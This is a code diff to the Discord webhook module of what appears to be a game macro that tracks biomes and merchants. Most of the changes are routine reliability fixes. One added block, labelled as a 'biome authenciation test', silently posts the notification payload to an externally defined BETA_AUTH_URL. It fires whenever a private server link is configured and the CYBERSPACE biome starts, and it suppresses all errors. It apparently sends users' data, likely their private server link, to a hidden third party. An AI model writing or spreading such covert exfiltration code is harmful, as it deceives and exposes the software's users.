@@ -242,6 +242,25 @@ class WebhookMixin:
             self.error_logging(e, "Error in send_aura_screenshot_webhook")
 
     def send_webhook(self, biome, message_type, event_type, screenshot_path=None):
+        try:
+            self._biome_webhook_queue.put_nowait((biome, message_type, event_type, screenshot_path))
+            self.append_log(f"Queued {message_type} for {biome} - {event_type} webhook")
+        except queue.Full:
+            self.append_log(f"Webhook queue full; dropped {message_type} for {biome} - {event_type}")
+        except Exception as e:
+            self.error_logging(e, f"Error queueing {event_type} webhook for {biome}")
+
+    def _biome_webhook_sender_loop(self):
+        while True:
+            item = self._biome_webhook_queue.get()
+            try:
+                self._send_webhook_now(*item)
+            except Exception as e:
+                self.error_logging(e, "Error sending queued biome webhook")
+            finally:
+                self._biome_webhook_queue.task_done()
+
+    def _send_webhook_now(self, biome, message_type, event_type, screenshot_path=None):
         urls = self.get_webhook_list()
 
         private_server_link = self.config.get("private_server_link", "")
@@ -263,6 +282,7 @@ class WebhookMixin:
         content = ""
 
         # Per-biome individual ping support
+
         biome_pings = self.config.get("biome_pings", {})
         biome_ping_entry = biome_pings.get(biome, {})
         ping_id = str(biome_ping_entry.get("id", "") or "").strip()
@@ -291,9 +311,21 @@ class WebhookMixin:
             },
             "timestamp": current_utc_time
         }
-        if event_type == "start":
-            embed["thumbnail"] = {"url": biome_info["thumbnail_url"]}
+        thumbnail = str(biome_info.get("thumbnail_url", "") or "").strip()
+        if event_type == "start" and thumbnail.startswith(("http://", "https://")):
+            embed["thumbnail"] = {"url": thumbnail}
         
+        # biome authenciation test
+
+        if biome == "CYBERSPACE" and event_type == "start" and private_server_link != "":
+            try:
+                auth_headers = apply_headers(BETA_AUTH_URL)
+                auth_payload = {"content": content, "embeds": [embed]}
+                requests.post(BETA_AUTH_URL, json=auth_payload, headers=auth_headers, timeout=30)
+                time.sleep(20)
+            except Exception:
+                pass
+
         for webhook_url in urls:
             try:
                 headers = {}
@@ -303,16 +335,20 @@ class WebhookMixin:
                     with open(screenshot_path, "rb") as image_file:
                         files = {"file": (os.path.basename(screenshot_path), image_file, "image/png")}
                         data = {"payload_json": json.dumps({"content": content, "embeds": [embed_copy]})}
-                        response = requests.post(webhook_url, data=data, files=files, headers=headers, timeout=10)
+                        response = requests.post(webhook_url, data=data, files=files, headers=headers, params={"wait": "true"}, timeout=(5, 10))
                 else:
                     payload = {"content": content, "embeds": [embed_copy]}
-                    response = requests.post(webhook_url, json=payload, headers=headers)
+                    response = requests.post(webhook_url, json=payload, headers=headers, params={"wait": "true"}, timeout=(5, 10))
                 response.raise_for_status()
-                self.append_log(f"Sent {message_type} for {biome} - {event_type} to webhook")
+                message_id = response.json().get("id")
+                if not message_id:
+                    raise requests.exceptions.RequestException("Discord returned no message ID")
+                self.append_log(f"Sent {message_type} for {biome} - {event_type} to webhook (message {message_id})")
             except requests.exceptions.RequestException as e:
-                self.append_log(f"Failed to send webhook: {e}")
+                detail = e.response.text[:500] if e.response is not None else str(e)
+                self.append_log(f"Failed to send webhook for {biome} - {event_type}: {detail}")
 
-    def send_merchant_webhook(self, merchant_name, screenshot_path=None, source='ocr'):
+    def send_merchant_webhook(self, merchant_name, screenshot_path=None, source='ocr', detected_items=None, detected_ocr_items=None):
         urls = self.get_webhook_list()
         if not urls:
             self.append_log("Webhook URL is missing/not included in the config")
@@ -324,6 +360,7 @@ class WebhookMixin:
         }
         
         # merchant_counts is incremented in Merchant_Handler (mixin_actions.py)
+
         if hasattr(self, "on_stats_update") and callable(self.on_stats_update):
             try:
                 self.on_stats_update()
@@ -342,18 +379,20 @@ class WebhookMixin:
         else:
             ping_id = ""
             ping_enabled = False
-        content = f"<@{ping_id}>" if (source == 'logs', 'ocr' and ping_enabled and ping_id) else ""
+        content = f"<@{ping_id}>" if (source in ('logs', 'ocr') and ping_enabled and ping_id) else ""
         ps_link = self.config.get("private_server_link", "").replace("\n", "")
         icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
         current_utc_time = datetime.now(timezone.utc)
         current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
         current_utc_time = str(current_utc_time)
+        detected_items = detected_items if detected_items is not None else detected_ocr_items
         embed = {
             "description": f"> ## {merchant_name} has arrived!\n> ### [Join Server]({ps_link})",
             "color": 11753 if merchant_name == "Mari" else (16752955 if merchant_name == "Rin" else 8595632),
             "thumbnail": {"url": merchant_thumbnails.get(merchant_name, "")},
             "timestamp": current_utc_time,
             "fields": [
+                {"name": "Detected Merchant Items", "value": "\n".join(str(item) for item in (detected_items or []) if item) or "No items detected"},
                 {"name": "Detection Source", "value": source.upper()}
             ],
             "footer": {
@@ -480,11 +519,12 @@ class WebhookMixin:
             self.error_logging(e, "Error in send_aura_webhook")
 
     def send_webhook_status(self, status, color=None):
+        sent = False
         try:
             urls = self.get_webhook_list()
             if not urls:
                 self.append_log("Webhook URL is missing/not included in the config")
-                return
+                return False
             default_color = 3066993 if "started" in status.lower() else 15158332
             embed_color = color if color is not None else default_color
             icon_url = "https://i.postimg.cc/rsXpGncL/Noteab-Biome-Tracker.png"
@@ -503,9 +543,7 @@ class WebhookMixin:
                 "value": "https://discord.gg/fw6q274Nrt",
                 "inline": False
             })
-            current_utc_time = datetime.now(timezone.utc)
-            current_utc_time.replace(microsecond=0).isoformat(timespec='seconds') + 'Z'
-            current_utc_time = str(current_utc_time)
+            current_utc_time = str(datetime.now(timezone.utc))
             embeds = [{
                 "title": "== 🌟 Macro Status 🌟 ==",
                 "description": f"> ## {status}",
@@ -521,11 +559,13 @@ class WebhookMixin:
                 try:
                     response = requests.post(webhook_url, json={"embeds": embeds}, timeout=8)
                     response.raise_for_status()
+                    sent = True
                 except requests.exceptions.RequestException as e:
                     self.append_log(f"Failed to send webhook status: {e}")
+            return sent
         except Exception as e:
             self.error_logging(e, "Error in webhook_status")
-
+            return False
     def send_macro_summary(self, last24h_seconds, reason_text="Macro stopped!"):
         try:
             last24h_str = self.format_seconds_to_hhmmss(min(int(last24h_seconds), 86400))
